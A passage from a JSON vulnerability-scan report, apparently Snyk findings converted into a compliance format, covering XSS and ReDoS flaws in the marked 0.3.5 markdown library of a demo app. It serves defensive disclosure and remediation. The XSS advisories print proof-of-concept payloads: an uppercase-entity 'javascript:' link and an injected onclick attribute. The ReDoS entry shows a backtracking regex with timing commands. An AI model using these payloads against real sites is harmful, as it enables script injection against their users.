          "desc": "## Overview\n[marked](https://marked.js.org/) is a low-level compiler for parsing markdown without caching or blocking for long periods of time.\n\nAffected versions of this package are vulnerable to Cross-site Scripting (XSS). Browsers support both lowercase and uppercase x in hexadecimal form of HTML character entity, but marked [unescaped only lowercase](https://github.com/chjj/marked/blob/v0.3.7/lib/marked.js#L1096-L1108).\r\n\r\nThis may allow an attacker to create a link with javascript code.\r\n\r\nFor example:\r\n```js\r\nvar marked = require('marked');\r\nmarked.setOptions({\r\n  renderer: new marked.Renderer(),\r\n  sanitize: true\r\n});\r\n\r\ntext = `\r\nlower[click me](javascript&#x3a;...)lower\r\nupper[click me](javascript&#X3a;...)upper\r\n`;\r\n\r\nconsole.log(marked(text));\r\n```\r\n\r\nwill render the following:\r\n\r\n```html\r\n<p>lowerlower\r\nupper<a href=\"javascript&#X3a;...\">click me</a>upper</p>\r\n\r\n```\n## Details\n\nA cross-site scripting attack occurs when the attacker tricks a legitimate web-based application or site to accept a request as originating from a trusted source.\n\nThis is done by escaping the context of the web application; the web application then delivers that data to its users along with other trusted dynamic content, without validating it. The browser unknowingly executes malicious script on the client side (through client-side languages; usually JavaScript or HTML)  in order to perform actions that are otherwise typically blocked by the browser’s Same Origin Policy.\n\nInjecting malicious code is the most prevalent manner by which XSS is exploited; for this reason, escaping characters in order to prevent this manipulation is the top method for securing code against this vulnerability.\n\nEscaping means that the application is coded to mark key characters, and particularly key characters included in user input, to prevent those characters from being interpreted in a dangerous context. For example, in HTML, `<` can be coded as  `&lt`; and `>` can be coded as `&gt`; in order to be interpreted and displayed as themselves in text, while within the code itself, they are used for HTML tags. If malicious content is injected into an application that escapes special characters and that malicious content uses `<` and `>` as HTML tags, those characters are nonetheless not interpreted as HTML tags by the browser if they’ve been correctly escaped in the application code and in this way the attempted attack is diverted.\n \nThe most prominent use of XSS is to steal cookies (source: OWASP HttpOnly) and hijack user sessions, but XSS exploits have been used to expose sensitive information, enable access to privileged services and functionality and deliver malware. \n\n### Types of attacks\nThere are a few methods by which XSS can be manipulated:\n\n|Type|Origin|Description|\n|--|--|--|\n|**Stored**|Server|The malicious code is inserted in the application (usually as a link) by the attacker. The code is activated every time a user clicks the link.|\n|**Reflected**|Server|The attacker delivers a malicious link externally from the vulnerable web site application to a user. When clicked, malicious code is sent to the vulnerable web site, which reflects the attack back to the user’s browser.| \n|**DOM-based**|Client|The attacker forces the user’s browser to render a malicious page. The data in the page itself delivers the cross-site scripting data.|\n|**Mutated**| |The attacker injects code that appears safe, but is then rewritten and modified by the browser, while parsing the markup. An example is rebalancing unclosed quotation marks or even adding quotation marks to unquoted parameters.|\n\n### Affected environments\nThe following environments are susceptible to an XSS attack:\n\n* Web servers\n* Application servers\n* Web application environments\n\n### How to prevent\nThis section describes the top best practices designed to specifically protect your code: \n\n* Sanitize data input in an HTTP request before reflecting it back, ensuring all data is validated, filtered or escaped before echoing anything back to the user, such as the values of query parameters during searches. \n* Convert special characters such as `?`, `&`, `/`, `<`, `>` and spaces to their respective HTML or URL encoded equivalents. \n* Give users the option to disable client-side scripts.\n* Redirect invalid requests.\n* Detect simultaneous logins, including those from two separate IP addresses, and invalidate those sessions.\n* Use and enforce a Content Security Policy (source: Wikipedia) to disable any features that might be manipulated for an XSS attack.\n* Read the documentation for any of the libraries referenced in your code to understand which elements allow for embedded HTML.\n\n## Remediation\nUpgrade `marked` to version 0.3.9 or higher.\n## References\n- [GitHub Commit](https://github.com/markedjs/marked/pull/976/commits/6d1901ff71abb83aa32ca9a5ce47471382ea42a9)\n- [GitHub Issue](https://github.com/chjj/marked/issues/925)\n- [GitHub PR](https://github.com/chjj/marked/pull/958)\n",
          "impact": 0.7,
          "code": "{\n  \"CVSSv3\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N\",\n  \"alternativeIds\": [\n    \"SNYK-JS-MARKED-10849\"\n  ],\n  \"creationTime\": \"2017-12-04T00:00:00.780000Z\",\n  \"credit\": [\n    \"Andrew Krasichkov\"\n  ],\n  \"cvssScore\": 7.5,\n  \"description\": \"## Overview\\n[marked](https://marked.js.org/) is a low-level compiler for parsing markdown without caching or blocking for long periods of time.\\n\\nAffected versions of this package are vulnerable to Cross-site Scripting (XSS). Browsers support both lowercase and uppercase x in hexadecimal form of HTML character entity, but marked [unescaped only lowercase](https://github.com/chjj/marked/blob/v0.3.7/lib/marked.js#L1096-L1108).\\r\\n\\r\\nThis may allow an attacker to create a link with javascript code.\\r\\n\\r\\nFor example:\\r\\n```js\\r\\nvar marked = require('marked');\\r\\nmarked.setOptions({\\r\\n  renderer: new marked.Renderer(),\\r\\n  sanitize: true\\r\\n});\\r\\n\\r\\ntext = `\\r\\nlower[click me](javascript&#x3a;...)lower\\r\\nupper[click me](javascript&#X3a;...)upper\\r\\n`;\\r\\n\\r\\nconsole.log(marked(text));\\r\\n```\\r\\n\\r\\nwill render the following:\\r\\n\\r\\n```html\\r\\n<p>lowerlower\\r\\nupper<a href=\\\"javascript&#X3a;...\\\">click me</a>upper</p>\\r\\n\\r\\n```\\n## Details\\n\\nA cross-site scripting attack occurs when the attacker tricks a legitimate web-based application or site to accept a request as originating from a trusted source.\\n\\nThis is done by escaping the context of the web application; the web application then delivers that data to its users along with other trusted dynamic content, without validating it. The browser unknowingly executes malicious script on the client side (through client-side languages; usually JavaScript or HTML)  in order to perform actions that are otherwise typically blocked by the browser’s Same Origin Policy.\\n\\nInjecting malicious code is the most prevalent manner by which XSS is exploited; for this reason, escaping characters in order to prevent this manipulation is the top method for securing code against this vulnerability.\\n\\nEscaping means that the application is coded to mark key characters, and particularly key characters included in user input, to prevent those characters from being interpreted in a dangerous context. For example, in HTML, `<` can be coded as  `&lt`; and `>` can be coded as `&gt`; in order to be interpreted and displayed as themselves in text, while within the code itself, they are used for HTML tags. If malicious content is injected into an application that escapes special characters and that malicious content uses `<` and `>` as HTML tags, those characters are nonetheless not interpreted as HTML tags by the browser if they’ve been correctly escaped in the application code and in this way the attempted attack is diverted.\\n \\nThe most prominent use of XSS is to steal cookies (source: OWASP HttpOnly) and hijack user sessions, but XSS exploits have been used to expose sensitive information, enable access to privileged services and functionality and deliver malware. \\n\\n### Types of attacks\\nThere are a few methods by which XSS can be manipulated:\\n\\n|Type|Origin|Description|\\n|--|--|--|\\n|**Stored**|Server|The malicious code is inserted in the application (usually as a link) by the attacker. The code is activated every time a user clicks the link.|\\n|**Reflected**|Server|The attacker delivers a malicious link externally from the vulnerable web site application to a user. When clicked, malicious code is sent to the vulnerable web site, which reflects the attack back to the user’s browser.| \\n|**DOM-based**|Client|The attacker forces the user’s browser to render a malicious page. The data in the page itself delivers the cross-site scripting data.|\\n|**Mutated**| |The attacker injects code that appears safe, but is then rewritten and modified by the browser, while parsing the markup. An example is rebalancing unclosed quotation marks or even adding quotation marks to unquoted parameters.|\\n\\n### Affected environments\\nThe following environments are susceptible to an XSS attack:\\n\\n* Web servers\\n* Application servers\\n* Web application environments\\n\\n### How to prevent\\nThis section describes the top best practices designed to specifically protect your code: \\n\\n* Sanitize data input in an HTTP request before reflecting it back, ensuring all data is validated, filtered or escaped before echoing anything back to the user, such as the values of query parameters during searches. \\n* Convert special characters such as `?`, `&`, `/`, `<`, `>` and spaces to their respective HTML or URL encoded equivalents. \\n* Give users the option to disable client-side scripts.\\n* Redirect invalid requests.\\n* Detect simultaneous logins, including those from two separate IP addresses, and invalidate those sessions.\\n* Use and enforce a Content Security Policy (source: Wikipedia) to disable any features that might be manipulated for an XSS attack.\\n* Read the documentation for any of the libraries referenced in your code to understand which elements allow for embedded HTML.\\n\\n## Remediation\\nUpgrade `marked` to version 0.3.9 or higher.\\n## References\\n- [GitHub Commit](https://github.com/markedjs/marked/pull/976/commits/6d1901ff71abb83aa32ca9a5ce47471382ea42a9)\\n- [GitHub Issue](https://github.com/chjj/marked/issues/925)\\n- [GitHub PR](https://github.com/chjj/marked/pull/958)\\n\",\n  \"disclosureTime\": \"2017-08-15T00:00:00Z\",\n  \"exploit\": \"Not Defined\",\n  \"fixedIn\": [\n    \"0.3.9\"\n  ],\n  \"functions\": [],\n  \"functions_new\": [],\n  \"id\": \"npm:marked:20170815\",\n  \"identifiers\": {\n    \"ALTERNATIVE\": [\n      \"SNYK-JS-MARKED-10849\"\n    ],\n    \"CVE\": [],\n    \"CWE\": [\n      \"CWE-79\"\n    ],\n    \"GHSA\": [\n      \"GHSA-8wp3-cp9v-44fm\"\n    ]\n  },\n  \"language\": \"js\",\n  \"malicious\": false,\n  \"modificationTime\": \"2020-12-14T14:41:09.243977Z\",\n  \"moduleName\": \"marked\",\n  \"packageManager\": \"npm\",\n  \"packageName\": \"marked\",\n  \"patches\": [],\n  \"proprietary\": false,\n  \"publicationTime\": \"2017-12-25T15:00:00Z\",\n  \"references\": [\n    {\n      \"title\": \"GitHub Commit\",\n      \"url\": \"https://github.com/markedjs/marked/pull/976/commits/6d1901ff71abb83aa32ca9a5ce47471382ea42a9\"\n    },\n    {\n      \"title\": \"GitHub Issue\",\n      \"url\": \"https://github.com/chjj/marked/issues/925\"\n    },\n    {\n      \"title\": \"GitHub PR\",\n      \"url\": \"https://github.com/chjj/marked/pull/958\"\n    }\n  ],\n  \"semver\": {\n    \"vulnerable\": [\n      \"<0.3.9\"\n    ]\n  },\n  \"severity\": \"high\",\n  \"socialTrendAlert\": false,\n  \"title\": \"Cross-site Scripting (XSS)\",\n  \"severityWithCritical\": \"high\",\n  \"from\": [\n    \"goof@1.0.1\",\n    \"marked@0.3.5\"\n  ],\n  \"upgradePath\": [\n    false,\n    \"marked@0.3.9\"\n  ],\n  \"isUpgradable\": true,\n  \"isPatchable\": false,\n  \"name\": \"marked\",\n  \"version\": \"0.3.5\"\n}",
          "results": [
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , marked@0.3.5 ]",
              "run_time": 0,
              "start_time": ""
            }
          ]
        },
        {
          "tags": {
            "cci": [
              "CCI-001310"
            ],
            "nist": [
              "SI-10"
            ],
            "cweid": [
              "79"
            ],
            "cveid": [],
            "ghsaid": [
              "wjmf-58vc-xqjr"
            ]
          },
          "descriptions": [],
          "refs": [],
          "source_location": {},
          "title": "Cross-site Scripting (XSS)",
          "id": "npm:marked:20170815-1",
          "desc": "## Overview\n[marked](https://marked.js.org/) is a low-level compiler for parsing markdown without caching or blocking for long periods of time.\n\nAffected versions of this package are vulnerable to Cross-site Scripting (XSS). When mangling is disabled via option `mangle`, marked doesn't escape target `href`. This may allow an attacker to inject arbitrary `html-event` into resulting a tag.\r\n\r\nFor example:\r\n```js\r\nvar marked = require('marked');\r\nmarked.setOptions({\r\n  renderer: new marked.Renderer(),\r\n  sanitize: true,\r\n  mangle: false\r\n});\r\n\r\ntext = `\r\n<bar\"onclick=\"alert('XSS')\"@foo>\r\n`;\r\n\r\nconsole.log(marked(text));\r\n```\r\n\r\nwill render:\r\n\r\n```html\r\n<p><a href=\"mailto:bar\"onclick=\"alert('XSS')\"@foo\">bar\"onclick=\"alert('XSS')\"@foo</a></p>\r\n```\n## Details\n\nA cross-site scripting attack occurs when the attacker tricks a legitimate web-based application or site to accept a request as originating from a trusted source.\n\nThis is done by escaping the context of the web application; the web application then delivers that data to its users along with other trusted dynamic content, without validating it. The browser unknowingly executes malicious script on the client side (through client-side languages; usually JavaScript or HTML)  in order to perform actions that are otherwise typically blocked by the browser’s Same Origin Policy.\n\nInjecting malicious code is the most prevalent manner by which XSS is exploited; for this reason, escaping characters in order to prevent this manipulation is the top method for securing code against this vulnerability.\n\nEscaping means that the application is coded to mark key characters, and particularly key characters included in user input, to prevent those characters from being interpreted in a dangerous context. For example, in HTML, `<` can be coded as  `&lt`; and `>` can be coded as `&gt`; in order to be interpreted and displayed as themselves in text, while within the code itself, they are used for HTML tags. If malicious content is injected into an application that escapes special characters and that malicious content uses `<` and `>` as HTML tags, those characters are nonetheless not interpreted as HTML tags by the browser if they’ve been correctly escaped in the application code and in this way the attempted attack is diverted.\n \nThe most prominent use of XSS is to steal cookies (source: OWASP HttpOnly) and hijack user sessions, but XSS exploits have been used to expose sensitive information, enable access to privileged services and functionality and deliver malware. \n\n### Types of attacks\nThere are a few methods by which XSS can be manipulated:\n\n|Type|Origin|Description|\n|--|--|--|\n|**Stored**|Server|The malicious code is inserted in the application (usually as a link) by the attacker. The code is activated every time a user clicks the link.|\n|**Reflected**|Server|The attacker delivers a malicious link externally from the vulnerable web site application to a user. When clicked, malicious code is sent to the vulnerable web site, which reflects the attack back to the user’s browser.| \n|**DOM-based**|Client|The attacker forces the user’s browser to render a malicious page. The data in the page itself delivers the cross-site scripting data.|\n|**Mutated**| |The attacker injects code that appears safe, but is then rewritten and modified by the browser, while parsing the markup. An example is rebalancing unclosed quotation marks or even adding quotation marks to unquoted parameters.|\n\n### Affected environments\nThe following environments are susceptible to an XSS attack:\n\n* Web servers\n* Application servers\n* Web application environments\n\n### How to prevent\nThis section describes the top best practices designed to specifically protect your code: \n\n* Sanitize data input in an HTTP request before reflecting it back, ensuring all data is validated, filtered or escaped before echoing anything back to the user, such as the values of query parameters during searches. \n* Convert special characters such as `?`, `&`, `/`, `<`, `>` and spaces to their respective HTML or URL encoded equivalents. \n* Give users the option to disable client-side scripts.\n* Redirect invalid requests.\n* Detect simultaneous logins, including those from two separate IP addresses, and invalidate those sessions.\n* Use and enforce a Content Security Policy (source: Wikipedia) to disable any features that might be manipulated for an XSS attack.\n* Read the documentation for any of the libraries referenced in your code to understand which elements allow for embedded HTML.\n\n## Remediation\nUpgrade `marked` to version 0.3.9 or higher.\n## References\n- [GitHub Commit](https://github.com/markedjs/marked/pull/976/commits/cb72584c5d9d32ebfdbb99e35fb9b81af2b79686)\n- [GitHub Issue](https://github.com/chjj/marked/issues/926)\n- [GitHub PR](https://github.com/chjj/marked/pull/958)\n",
          "impact": 0.5,
          "code": "{\n  \"CVSSv3\": \"CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N\",\n  \"alternativeIds\": [\n    \"SNYK-JS-MARKED-10850\"\n  ],\n  \"creationTime\": \"2017-12-04T00:00:00.780000Z\",\n  \"credit\": [\n    \"Andrew Krasichkov\"\n  ],\n  \"cvssScore\": 4.8,\n  \"description\": \"## Overview\\n[marked](https://marked.js.org/) is a low-level compiler for parsing markdown without caching or blocking for long periods of time.\\n\\nAffected versions of this package are vulnerable to Cross-site Scripting (XSS). When mangling is disabled via option `mangle`, marked doesn't escape target `href`. This may allow an attacker to inject arbitrary `html-event` into resulting a tag.\\r\\n\\r\\nFor example:\\r\\n```js\\r\\nvar marked = require('marked');\\r\\nmarked.setOptions({\\r\\n  renderer: new marked.Renderer(),\\r\\n  sanitize: true,\\r\\n  mangle: false\\r\\n});\\r\\n\\r\\ntext = `\\r\\n<bar\\\"onclick=\\\"alert('XSS')\\\"@foo>\\r\\n`;\\r\\n\\r\\nconsole.log(marked(text));\\r\\n```\\r\\n\\r\\nwill render:\\r\\n\\r\\n```html\\r\\n<p><a href=\\\"mailto:bar\\\"onclick=\\\"alert('XSS')\\\"@foo\\\">bar\\\"onclick=\\\"alert('XSS')\\\"@foo</a></p>\\r\\n```\\n## Details\\n\\nA cross-site scripting attack occurs when the attacker tricks a legitimate web-based application or site to accept a request as originating from a trusted source.\\n\\nThis is done by escaping the context of the web application; the web application then delivers that data to its users along with other trusted dynamic content, without validating it. The browser unknowingly executes malicious script on the client side (through client-side languages; usually JavaScript or HTML)  in order to perform actions that are otherwise typically blocked by the browser’s Same Origin Policy.\\n\\nInjecting malicious code is the most prevalent manner by which XSS is exploited; for this reason, escaping characters in order to prevent this manipulation is the top method for securing code against this vulnerability.\\n\\nEscaping means that the application is coded to mark key characters, and particularly key characters included in user input, to prevent those characters from being interpreted in a dangerous context. For example, in HTML, `<` can be coded as  `&lt`; and `>` can be coded as `&gt`; in order to be interpreted and displayed as themselves in text, while within the code itself, they are used for HTML tags. If malicious content is injected into an application that escapes special characters and that malicious content uses `<` and `>` as HTML tags, those characters are nonetheless not interpreted as HTML tags by the browser if they’ve been correctly escaped in the application code and in this way the attempted attack is diverted.\\n \\nThe most prominent use of XSS is to steal cookies (source: OWASP HttpOnly) and hijack user sessions, but XSS exploits have been used to expose sensitive information, enable access to privileged services and functionality and deliver malware. \\n\\n### Types of attacks\\nThere are a few methods by which XSS can be manipulated:\\n\\n|Type|Origin|Description|\\n|--|--|--|\\n|**Stored**|Server|The malicious code is inserted in the application (usually as a link) by the attacker. The code is activated every time a user clicks the link.|\\n|**Reflected**|Server|The attacker delivers a malicious link externally from the vulnerable web site application to a user. When clicked, malicious code is sent to the vulnerable web site, which reflects the attack back to the user’s browser.| \\n|**DOM-based**|Client|The attacker forces the user’s browser to render a malicious page. The data in the page itself delivers the cross-site scripting data.|\\n|**Mutated**| |The attacker injects code that appears safe, but is then rewritten and modified by the browser, while parsing the markup. An example is rebalancing unclosed quotation marks or even adding quotation marks to unquoted parameters.|\\n\\n### Affected environments\\nThe following environments are susceptible to an XSS attack:\\n\\n* Web servers\\n* Application servers\\n* Web application environments\\n\\n### How to prevent\\nThis section describes the top best practices designed to specifically protect your code: \\n\\n* Sanitize data input in an HTTP request before reflecting it back, ensuring all data is validated, filtered or escaped before echoing anything back to the user, such as the values of query parameters during searches. \\n* Convert special characters such as `?`, `&`, `/`, `<`, `>` and spaces to their respective HTML or URL encoded equivalents. \\n* Give users the option to disable client-side scripts.\\n* Redirect invalid requests.\\n* Detect simultaneous logins, including those from two separate IP addresses, and invalidate those sessions.\\n* Use and enforce a Content Security Policy (source: Wikipedia) to disable any features that might be manipulated for an XSS attack.\\n* Read the documentation for any of the libraries referenced in your code to understand which elements allow for embedded HTML.\\n\\n## Remediation\\nUpgrade `marked` to version 0.3.9 or higher.\\n## References\\n- [GitHub Commit](https://github.com/markedjs/marked/pull/976/commits/cb72584c5d9d32ebfdbb99e35fb9b81af2b79686)\\n- [GitHub Issue](https://github.com/chjj/marked/issues/926)\\n- [GitHub PR](https://github.com/chjj/marked/pull/958)\\n\",\n  \"disclosureTime\": \"2017-08-15T00:00:00Z\",\n  \"exploit\": \"Not Defined\",\n  \"fixedIn\": [\n    \"0.3.9\"\n  ],\n  \"functions\": [],\n  \"functions_new\": [],\n  \"id\": \"npm:marked:20170815-1\",\n  \"identifiers\": {\n    \"ALTERNATIVE\": [\n      \"SNYK-JS-MARKED-10850\"\n    ],\n    \"CVE\": [],\n    \"CWE\": [\n      \"CWE-79\"\n    ],\n    \"GHSA\": [\n      \"GHSA-wjmf-58vc-xqjr\"\n    ]\n  },\n  \"language\": \"js\",\n  \"malicious\": false,\n  \"modificationTime\": \"2020-12-14T14:41:09.478113Z\",\n  \"moduleName\": \"marked\",\n  \"packageManager\": \"npm\",\n  \"packageName\": \"marked\",\n  \"patches\": [],\n  \"proprietary\": false,\n  \"publicationTime\": \"2017-12-25T15:00:00Z\",\n  \"references\": [\n    {\n      \"title\": \"GitHub Commit\",\n      \"url\": \"https://github.com/markedjs/marked/pull/976/commits/cb72584c5d9d32ebfdbb99e35fb9b81af2b79686\"\n    },\n    {\n      \"title\": \"GitHub Issue\",\n      \"url\": \"https://github.com/chjj/marked/issues/926\"\n    },\n    {\n      \"title\": \"GitHub PR\",\n      \"url\": \"https://github.com/chjj/marked/pull/958\"\n    }\n  ],\n  \"semver\": {\n    \"vulnerable\": [\n      \"<0.3.9\"\n    ]\n  },\n  \"severity\": \"medium\",\n  \"socialTrendAlert\": false,\n  \"title\": \"Cross-site Scripting (XSS)\",\n  \"severityWithCritical\": \"medium\",\n  \"from\": [\n    \"goof@1.0.1\",\n    \"marked@0.3.5\"\n  ],\n  \"upgradePath\": [\n    false,\n    \"marked@0.3.9\"\n  ],\n  \"isUpgradable\": true,\n  \"isPatchable\": false,\n  \"name\": \"marked\",\n  \"version\": \"0.3.5\"\n}",
          "results": [
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , marked@0.3.5 ]",
              "run_time": 0,
              "start_time": ""
            }
          ]
        },
        {
          "tags": {
            "cci": [
              "CCI-001310"
            ],
            "nist": [
              "SI-10"
            ],
            "cweid": [
              "400"
            ],
            "cveid": [
              "2017-16114"
            ],
            "ghsaid": [
              "x5pg-88wf-qq4p"
            ]
          },
          "descriptions": [],
          "refs": [],
          "source_location": {},
          "title": "Regular Expression Denial of Service (ReDoS)",
          "id": "npm:marked:20170907",
          "desc": "## Overview\n\n[marked](https://marked.js.org/) is a low-level compiler for parsing markdown without caching or blocking for long periods of time.\n\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS)\nwhen parsing the input markdown content (1,000 characters costs around 6 seconds matching time).\n\n## Details\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\r\n\r\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\r\n\r\nLet’s take the following regular expression as an example:\r\n```js\r\nregex = /A(B|C+)+D/\r\n```\r\n\r\nThis regular expression accomplishes the following:\r\n- `A` The string must start with the letter 'A'\r\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\r\n- `D` Finally, we ensure this section of the string ends with a 'D'\r\n\r\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\r\n\r\nIt most cases, it doesn't take very long for a regex engine to find a match:\r\n\r\n```bash\r\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\r\n0.04s user 0.01s system 95% cpu 0.052 total\r\n\r\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\r\n1.79s user 0.02s system 99% cpu 1.812 total\r\n```\r\n\r\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\r\n\r\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\r\n\r\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\r\n1. CCC\r\n2. CC+C\r\n3. C+CC\r\n4. C+C+C.\r\n\r\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\r\n\r\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\r\n\r\n| String | Number of C's | Number of steps |\r\n| -------|-------------:| -----:|\r\n| ACCCX | 3 | 38\r\n| ACCCCX | 4 | 71\r\n| ACCCCCX | 5 | 136\r\n| ACCCCCCCCCCCCCCX | 14 | 65,553\r\n\r\n\r\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\n\nUpgrade `marked` to version 0.3.9 or higher.\n\n\n## References\n\n- [GitHub Issue](https://github.com/chjj/marked/issues/937)\n\n- [GitHub PR](https://github.com/chjj/marked/pull/958)\n",
          "impact": 0.7,
          "code": "{\n  \"CVSSv3\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H\",\n  \"alternativeIds\": [\n    \"SNYK-JS-MARKED-10782\"\n  ],\n  \"creationTime\": \"2017-09-21T08:07:51.834000Z\",\n  \"credit\": [\n    \"Cristian-Alexandru Staicu\"\n  ],\n  \"cvssScore\": 7.5,\n  \"description\": \"## Overview\\n\\n[marked](https://marked.js.org/) is a low-level compiler for parsing markdown without caching or blocking for long periods of time.\\n\\n\\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS)\\nwhen parsing the input markdown content (1,000 characters costs around 6 seconds matching time).\\n\\n## Details\\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\\r\\n\\r\\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\\r\\n\\r\\nLet’s take the following regular expression as an example:\\r\\n```js\\r\\nregex = /A(B|C+)+D/\\r\\n```\\r\\n\\r\\nThis regular expression accomplishes the following:\\r\\n- `A` The string must start with the letter 'A'\\r\\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\\r\\n- `D` Finally, we ensure this section of the string ends with a 'D'\\r\\n\\r\\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\\r\\n\\r\\nIt most cases, it doesn't take very long for a regex engine to find a match:\\r\\n\\r\\n```bash\\r\\n$ time node -e '/A(B|C+)+D/.test(\\\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\\\")'\\r\\n0.04s user 0.01s system 95% cpu 0.052 total\\r\\n\\r\\n$ time node -e '/A(B|C+)+D/.test(\\\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\\\")'\\r\\n1.79s user 0.02s system 99% cpu 1.812 total\\r\\n```\\r\\n\\r\\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\\r\\n\\r\\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\\r\\n\\r\\nLet's look at how our expression runs into this problem, using a shorter string: \\\"ACCCX\\\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\\r\\n1. CCC\\r\\n2. CC+C\\r\\n3. C+CC\\r\\n4. C+C+C.\\r\\n\\r\\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\\r\\n\\r\\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\\r\\n\\r\\n| String | Number of C's | Number of steps |\\r\\n| -------|-------------:| -----:|\\r\\n| ACCCX | 3 | 38\\r\\n| ACCCCX | 4 | 71\\r\\n| ACCCCCX | 5 | 136\\r\\n| ACCCCCCCCCCCCCCX | 14 | 65,553\\r\\n\\r\\n\\r\\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\\n\\n## Remediation\\n\\nUpgrade `marked` to version 0.3.9 or higher.\\n\\n\\n## References\\n\\n- [GitHub Issue](https://github.com/chjj/marked/issues/937)\\n\\n- [GitHub PR](https://github.com/chjj/marked/pull/958)\\n\",\n  \"disclosureTime\": \"2017-09-07T21:00:00Z\",\n  \"exploit\": \"Not Defined\",\n  \"fixedIn\": [\n    \"0.3.9\"\n  ],\n  \"functions\": [],\n  \"functions_new\": [],\n  \"id\": \"npm:marked:20170907\",\n  \"identifiers\": {\n    \"ALTERNATIVE\": [\n      \"SNYK-JS-MARKED-10782\"\n    ],\n    \"CVE\": [\n      \"CVE-2017-16114\"\n    ],\n    \"CWE\": [\n      \"CWE-400\"\n    ],\n    \"GHSA\": [\n      \"GHSA-x5pg-88wf-qq4p\"\n    ],\n    \"NSP\": [\n      \"531\"\n    ]\n  },\n  \"language\": \"js\",\n  \"malicious\": false,\n  \"modificationTime\": \"2020-12-22T17:02:11.656103Z\",\n  \"moduleName\": \"marked\",\n  \"packageManager\": \"npm\",\n  \"packageName\": \"marked\",\n  \"patches\": [\n    {\n      \"comments\": [],\n      \"id\": \"patch:npm:marked:20170907:0\",\n      \"modificationTime\": \"2019-12-03T11:40:45.876422Z\",\n      \"urls\": [\n        \"https://snyk-patches.s3.amazonaws.com/npm/marked/20170907/marked_20170907_0_0_4afb8ce135a1e020e48f7084340333dd0c18229f.patch\"\n      ],\n      \"version\": \"<=0.3.6 >0.3.3\"\n    }\n  ],\n  \"proprietary\": false,\n  \"publicationTime\": \"2017-09-21T08:07:51Z\",\n  \"references\": [\n    {\n      \"title\": \"GitHub Issue\",\n      \"url\": \"https://github.com/chjj/marked/issues/937\"\n    },\n    {\n      \"title\": \"GitHub PR\",\n      \"url\": \"https://github.com/chjj/marked/pull/958\"\n    }\n  ],\n  \"semver\": {\n    \"vulnerable\": [\n      \"<0.3.9\"\n    ]\n  },\n  \"severity\": \"high\",\n  \"socialTrendAlert\": false,\n  \"title\": \"Regular Expression Denial of Service (ReDoS)\",\n  